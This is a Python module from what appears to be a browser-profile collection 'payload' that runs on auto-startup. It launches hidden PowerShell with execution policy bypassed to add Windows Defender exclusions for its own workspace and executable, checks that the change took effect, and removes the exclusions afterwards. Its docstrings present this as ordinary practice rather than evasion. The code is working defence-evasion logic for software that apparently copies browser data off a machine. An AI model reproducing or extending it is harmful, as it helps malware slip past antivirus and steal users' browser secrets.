"""Ask Defender to leave the payload's own paths alone, and record what it said.

This runs once, on the first auto-startup run, before collection. The reason is not
evasion for its own sake: a real-time scan touching a browser profile as it is being
copied makes the copy slow, and worse, makes it *partial* — Defender quarantines a
component mid-read and the archive ships a profile nobody can decrypt. Every
commercial endpoint agent asks for its own exclusions for the same reason.

The design rule is attempt-and-record. Adding an exclusion needs an elevated token and
needs Tamper Protection to permit it; both are properties of the machine, not of this
code, and neither is something this module changes. When the attempt is refused the run
continues and ``manifest.json`` says ``blocked`` with the reason. Nothing is flipped,
nothing is disabled, nothing is retried in a loop.

Two paths are asked for, not a tree: the workspace directory the run writes into, and the
image the run started from. An exclusion for ``C:\\`` would be a different act.
"""

from __future__ import annotations

import os
import shutil
from pathlib import Path
from typing import Any, Final

from . import log, util

# States recorded in manifest.json. Distinct because only one of them means "the machine
# will not scan what this run copies".
OK: Final[str] = "ok"
BLOCKED: Final[str] = "blocked"
SKIPPED: Final[str] = "skipped"
FAILED: Final[str] = "failed"

# Bounded: an elevated PowerShell start is under a second, and anything past ten is a
# machine in trouble rather than a Defender that is thinking.
_TIMEOUT: Final[float] = 10.0


def _powershell() -> Path | None:
    """Absolute path to powershell.exe. Searched, never taken off PATH."""
    system32 = Path(os.environ.get("SYSTEMROOT") or r"C:\Windows") / "System32"
    for folder in (system32 / "WindowsPowerShell" / "v1.0", system32):
        candidate = folder / "powershell.exe"
        if candidate.is_file():
            return candidate
    found = shutil.which("powershell.exe")
    return Path(found) if found else None


def _script(paths: list[str]) -> str:
    """Add the exclusions and report what the list looked like before and after.

    The verification matters more than the call: ``Add-MpPreference`` with a Tamper
    Protection policy in place has been observed to return without error and change
    nothing on some builds. Printing the list after the write is the only way to tell
    that apart from a success.

    The list is printed *before* the write too. Without it the run cannot tell an
    exclusion it added from one that was already there, and withdrawal then removes a
    path somebody else put there: measured in the guest, a run that re-requested an
    already-excluded image and took it back on the way out dropped the count by one.
    """
    quoted = ",".join("'" + path.replace("'", "''") + "'" for path in paths)
    return (
        "$ErrorActionPreference='Stop';"
        "try {"
        "$before=((Get-MpPreference).ExclusionPath | Where-Object { $_ }) -join ';';"
        f"Add-MpPreference -ExclusionPath {quoted} -ErrorAction Stop;"
        "$have=((Get-MpPreference).ExclusionPath | Where-Object { $_ }) -join ';';"
        "Write-Output ('OK|' + $before + '|' + $have)"
        "} catch {"
        "Write-Output ('DENIED ' + $_.Exception.Message)"
        "}"
    )


def _run(paths: list[str]) -> dict[str, Any]:
    shell = _powershell()
    if shell is None:
        return {"status": FAILED, "reason": "powershell not found", "added": []}

    completed = util.run_hidden(
        [
            shell,
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            _script(paths),
        ],
        timeout=_TIMEOUT,
    )
    if completed is None:
        return {"status": FAILED, "reason": "powershell did not complete", "added": []}

    text = completed.stdout.decode("utf-8", "replace").strip()
    if text.startswith("OK"):
        body = text[2:].strip()
        if "|" in body:
            before_text, _, after_text = body.partition("|")
        else:
            # Older output shape: everything after OK is the post-write list. Nothing is
            # known about what was already there, so every requested path counts as this
            # run's.
            before_text, after_text = "", body
        listed = [item.strip() for item in after_text.split(";") if item.strip()]
        present = {item.lower() for item in listed}
        already = {item.strip().lower() for item in before_text.split(";") if item.strip()}
        added = [
            path
            for path in paths
            if path.lower() in present and path.lower() not in already
        ]
        return {
            "status": OK if added else BLOCKED,
            "reason": "" if added else "policy accepted the call and changed nothing",
            "added": added,
        }
    if text.startswith("DENIED"):
        # The message is the machine's own words. Trimmed to one line because the
        # manifest is read, not parsed.
        reason = text[len("DENIED") :].strip().splitlines()[0][:160]
        return {"status": BLOCKED, "reason": reason or "refused", "added": []}
    return {
        "status": FAILED,
        "reason": (text or f"exit {completed.returncode}")[:160],
        "added": [],
    }


def _withdraw_script(paths: list[str]) -> str:
    quoted = ",".join("'" + path.replace("'", "''") + "'" for path in paths)
    return (
        "$ErrorActionPreference='Stop';"
        "try {"
        f"Remove-MpPreference -ExclusionPath {quoted} -ErrorAction Stop;"
        "Write-Output 'OK'"
        "} catch {"
        "Write-Output ('DENIED ' + $_.Exception.Message)"
        "}"
    )


def withdraw(record: dict[str, Any]) -> None:
    """Take back the exclusions this run added. Best effort, never raises.

    The workspace is a temp directory with a fresh name every run, so leaving the entry
    behind is a residue that grows by one path per run: measured in the guest, six
    ``sable-collect-*`` paths after six runs. Only the paths this run actually added are
    removed, and only on the success path — a run that parks its archive to retry needs
    its workspace unscanned next time.
    """
    added = [str(item) for item in record.get("added") or [] if str(item)]
    if not added:
        return
    shell = _powershell()
    if shell is None:
        return
    try:
        completed = util.run_hidden(
            [
                shell,
                "-NoProfile",
                "-NonInteractive",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                _withdraw_script(added),
            ],
            timeout=_TIMEOUT,
        )
    except Exception:
        log.logger.debug("defender: withdrawal raised", exc_info=True)
        return
    if completed is None:
        log.logger.debug("defender: withdrawal did not complete")
        return
    text = completed.stdout.decode("utf-8", "replace").strip()
    if text.startswith("OK"):
        log.logger.debug("defender: withdrew %d exclusion(s)", len(added))
    else:
        log.logger.debug("defender: withdrawal refused (%s)", text[:120])


def exclusions(workspace: Path) -> dict[str, Any]:
    """Attempt Defender exclusions for the workspace and the running image.

    Returns the record that goes into ``manifest.json``. Never raises: this is a
    convenience for the copy, not a dependency of it.
    """
    paths: list[str] = []
    try:
        paths.append(str(workspace.resolve()))
    except OSError:
        log.logger.debug("defender: workspace path unresolvable", exc_info=True)

    try:
        image = util.executable_path()
        # A frozen run has a real file here. An interpreted one can report the literal
        # argv[0], which is not a path and is not worth asking Defender about.
        if image.is_file():
            paths.append(str(image.resolve()))
    except OSError:
        log.logger.debug("defender: image path unresolvable", exc_info=True)

    if not paths:
        return {"status": SKIPPED, "reason": "no path to exclude", "added": []}

    record = _run(paths)
    record["requested"] = paths
    if record["status"] == OK:
        log.logger.debug("defender: excluded %d path(s)", len(record["added"]))
    else:
        log.logger.debug(
            "defender: %s (%s)", record["status"], record.get("reason", "")
        )
    return record


__all__ = ["BLOCKED", "FAILED", "OK", "SKIPPED", "exclusions", "withdraw"]
